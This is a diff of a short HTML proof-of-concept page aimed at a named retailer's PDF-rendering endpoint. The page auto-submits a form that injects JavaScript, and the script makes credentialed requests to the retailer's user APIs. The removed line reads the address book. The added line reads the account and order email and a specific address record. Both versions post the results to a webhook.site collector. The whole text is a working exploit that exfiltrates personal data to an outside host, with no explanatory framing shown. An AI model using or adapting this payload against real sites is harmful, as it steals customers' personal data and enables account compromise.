@@ -2,7 +2,7 @@
 <html>
 <body>
 <form id="f" action="https://pdf.shein.com/html" method="POST">
-<input name="content" value='<script>var x=new XMLHttpRequest();x.open("GET","https://eur.shein.com/bff-api/user-api/addressbook/address_book/get?_ver=1.1.8&_lang=en");x.withCredentials=true;x.onload=function(){var y=new XMLHttpRequest();y.open("POST","https://webhook.site/afa8e098-cdf4-4c25-8230-2abe0bddd66f");y.send(x.responseText)};x.send()</script>'>
+<input name="content" value='<script>var x=new XMLHttpRequest();x.open("POST","https://eur.shein.com/bff-api/user-api/addressbook/getAccountAndOrderEmail?_ver=1.1.8&_lang=en");x.withCredentials=true;x.onload=function(){var e=x.responseText;var z=new XMLHttpRequest();z.open("GET","https://eur.shein.com/bff-api/user-api/addressbook/address_detail?_ver=1.1.8&_lang=en&address_id=1968858494&scene=0");z.withCredentials=true;z.onload=function(){var y=new XMLHttpRequest();y.open("POST","https://webhook.site/afa8e098-cdf4-4c25-8230-2abe0bddd66f");y.send(JSON.stringify({email:e,address:z.responseText}))};z.send()};x.send()</script>'>
 </form>
 <script>document.getElementById("f").submit();</script>
 </body>
